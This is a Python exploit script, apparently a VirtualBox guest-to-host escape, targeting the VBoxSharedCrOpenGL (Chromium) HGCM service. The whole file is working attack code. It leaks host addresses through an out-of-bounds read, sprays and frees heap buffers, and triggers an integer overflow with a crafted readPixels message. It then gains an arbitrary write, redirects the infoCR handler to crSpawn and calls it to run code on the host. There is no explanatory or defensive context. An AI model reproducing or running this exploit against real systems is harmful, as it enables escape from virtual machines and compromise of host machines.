import sys,os
from time import *
from pwn import *
from struct import pack, unpack
sys.path.append(os.path.abspath(os.path.dirname(__file__)) + '/lib')
from chromium import *

def nop_msg():
    msg = (pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
        + '\x00\x00\x00' + chr(CR_NOP_OPCODE)
        + pack("<IIII", 0x41414141, 0x41414141, 0x41414141, 0x41414141))
    return msg
def infoCR(ptr):
    msg = (pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
            + '\x00\x00\x00' + chr(CR_BOUNDSINFOCR_OPCODE)
            + pack("<I", 16) + pack("<I", 0x6c616378) + pack("<I", 0x63) + pack("<I", 0x63)
            + pack("<I", 0x63) + pack("<I", 0) + pack("<Q", ptr) + pack("<I", 0)
            + pack("<I", 0) + pack("<I", 0))
    return msg

def readPixels():
    msg = (pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
        + '\x00\x00\x00' + chr(CR_READPIXELS_OPCODE)
        + pack("<I", 0x0) + pack("<I", 0x0) + pack("<I", 0x0) + pack("<I", 0x8) 
        + pack("<I", 0x35) + pack("<I", 0x0) + pack("<I", 0x0) + pack("<I", 0x0) 
        + pack("<I", 0x0) + pack("<I", 0x0) + pack("<I", 0x1ffffffd) + pack("<I", 0x0) 
        + pack("<I", 0xdeadbeef) + pack("<I", 0xffffffff))
    return msg

def make_leak_msg(offset):
    msg = (pack("<III", CR_MESSAGE_OPCODES, 0x41414141, 1)
        + '\x00\x00\x00' + chr(CR_EXTEND_OPCODE)
        + pack("<i", offset) + pack("<I", CR_GETATTRIBLOCATION_EXTEND_OPCODE) + pack("<I", 0x41424344))
    return msg

def write(address, data):
    client = hgcm_connect("VBoxSharedCrOpenGL")
    set_version(client)
    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [
        0xdeadbeef, 0xffffffff, 0,('A'*0x20 + pack("<Q", 0x0) + pack("<Q", 0x35) 
            + pack("<I", 0xddddeeee) + pack("<I", 0xffffffff) + pack("<Q", address))])
    log.success("Overflowed chunk -> pData = 0x%x"%address)

    hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [
        0xddddeeee, 0xffffffff, 0, p64(data)])

    hgcm_disconnect(client)

def leak():
    cr_server = 0
    cr_infocr = 0
    cr_spawn = 0
    while True:
        client = hgcm_connect("VBoxSharedCrOpenGL")
        set_version(client)
        for offset in range(-0x300, 0x300, 0x10):
            lmsg = make_leak_msg(offset)
            lret = crmsg(client, lmsg)
            leak1 = u64(lret[8:16])
            leak2 = u64(lret[16:24])
            if leak1 % 0x1000 == 0x968:
                cr_server = leak1 + 0x22ed98
                cr_infocr = cr_server + 0xae98
                cr_spawn = cr_server - 0x5361f0
                break
            elif leak2 % 0x1000 == 0x968:
                cr_server = leak2 + 0x22ed98
                cr_infocr = cr_server + 0xae98
                cr_spawn = cr_server - 0x5361f0
                break
        hgcm_disconnect(client)
        if cr_server != 0x0 or cr_infocr != 0x0 or cr_spawn != 0x0:
            break
    return cr_server, cr_infocr, cr_spawn
def exploit():
    cr_server, cr_infocr, cr_spawn = leak()
    log.success("cr_server : 0x%x"%cr_server)
    log.success("cr_infocr : 0x%x"%cr_infocr)
    log.success("cr_spawn  : 0x%x"%cr_spawn)

    bufs = []
    nop = nop_msg()
    uiId = 0xdeadbeef
    uiSize = 0xffffffff
    rdp = readPixels()

    client = hgcm_connect("VBoxSharedCrOpenGL")
    set_version(client)

    log.info("Allocate nop_msg")
    for i in range(10000):
        _id = alloc_buf(client, len(nop), nop)
        bufs.append(_id)
    log.success("Success Allocate")
    
    log.info("Free bufs i % 2000")
    for i in bufs[::-1]:
        if i % 2000 == 0:
            hgcm_call(client, SHCRGL_GUEST_FN_WRITE_READ_BUFFERED, [i, '\x00'*0x20, 0])
    log.success("Success Free")


    log.info("Allocate readPixels")
    crmsg(client, rdp)
    log.success("Success Trigger")

    log.info("Overwrite Chunk uiId uiSize")
    try:
        hgcm_call(client, SHCRGL_GUEST_FN_WRITE_BUFFER, [uiId, uiSize, 0, 'A'])
        log.success("Success Overwrite")
    except:
        log.failure("! Failed !")
        return False

    log.info("OOB Write infocr to crSpawn")
    write(cr_infocr, cr_spawn)
    log.success("Overwrite infocr -> crSpawn")

    log.info("Call infoCR")
    crmsg(client, infoCR(cr_server))
    log.success("All Done!!!!")

if __name__ == '__main__':
    sleep(1)
    if exploit() is False:
        log.failure("Exploit Failed... retry")

